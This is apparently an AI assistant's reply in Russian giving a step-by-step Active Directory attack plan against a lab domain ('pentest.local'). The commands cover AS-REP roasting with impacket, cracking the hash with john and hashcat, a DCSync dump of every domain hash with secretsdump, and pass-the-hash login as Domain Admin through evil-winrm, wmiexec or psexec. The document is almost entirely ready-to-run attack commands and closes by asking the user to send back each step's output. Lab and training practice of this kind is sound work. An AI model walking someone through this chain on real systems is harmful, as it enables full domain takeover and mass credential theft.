## ⚡ План v2 — без netexec, только impacket + стандартные утилиты:

```bash
DC=192.168.56.102   # ← замени на IP твоего Windows Server
DOMAIN=pentest.local
```

---

### ШАГ 1: Разведка (nmap)
```bash
nmap -p 88,389,445,5985 $DC --open
```

---

### ШАГ 2: AS-REP Roasting через impacket
```bash
impacket-GetNPUsers $DOMAIN/ -no-pass -format john -outputfile asrep.txt

# Посмотреть результат:
cat asrep.txt
```

Если не знает домен — попробуй:
```bash
impacket-GetNPUsers pentest.local/ -no-pass -format john -outputfile asrep.txt
```

Или с явным DC:
```bash
impacket-GetNPUsers pentest.local/ -no-pass -dc-ip $DC -format john -outputfile asrep.txt
```

---

### ШАГ 3: Взлом хеша
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt

# Показать пароль:
john --show asrep.txt
```

Если john не знает формат:
```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --show
```

**Результат:** `svc_backupagent:Welcome2024!`

---

### ШАГ 4: Проверка прав взломанного юзера
```bash
impacket-lookupsid pentest.local/svc_backupagent:'Welcome2024!'@$DC

# Или через rpcclient:
rpcclient -U 'svc_backupagent%Welcome2024!' $DC -c "enumdomgroups; getdompwinfo"
```

---

### ШАГ 5: DCSync — все хеши домена
```bash
impacket-secretsdump pentest.local/svc_backupagent:'Welcome2024!'@$DC
```

**Ищем строку:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>
```

---

### ШАГ 6: Вход как Domain Admin
```bash
# Вариант A — evil-winrm:
evil-winrm -i $DC -u Administrator -H <NTLM_HASH_ИЗ_ШАГА_5>

# Вариант B — если evil-winrm нет, через impacket:
impacket-wmiexec pentest.local/Administrator@${DC} -hashes :<NTLM_HASH>

# Вариант C — через psexec:
impacket-psexec pentest.local/Administrator@${DC} -hashes :<NTLM_HASH>
```

После входа:
```cmd
whoami /all
net user /domain
```

---

### 📦 Если impacket не установлен:
```bash
sudo apt update
sudo apt install impacket-scripts -y

# Проверить:
which impacket-GetNPUsers
which impacket-secretsdump
```

---

### 🔧 Если rockyou.txt нет:
```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
ls -la /usr/share/wordlists/rockyou.txt
```

---

Выполняй по шагам, скидывай вывод каждого — разберёмся если где-то ошибка.
